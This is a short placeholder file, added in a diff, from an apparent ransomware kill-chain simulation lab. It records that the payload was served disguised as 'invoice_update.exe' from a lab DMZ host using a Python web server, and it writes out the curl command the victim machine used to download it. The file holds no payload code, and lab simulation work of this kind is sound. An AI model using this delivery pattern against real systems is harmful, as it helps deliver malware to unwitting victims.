@@ -1,0 +1,11 @@
+This is a placeholder file representing the malicious payload used
+in the Network Security Ransomware Kill Chain Simulation project.
+
+In the actual environment, this was served as `invoice_update.exe`
+from the Ubuntu DMZ server (10.10.20.10) using:
+
+    python3 -m http.server 8080
+
+The Windows victim downloaded it using:
+
+    curl http://10.10.20.10:8080/invoice_update.exe -O malware.exe
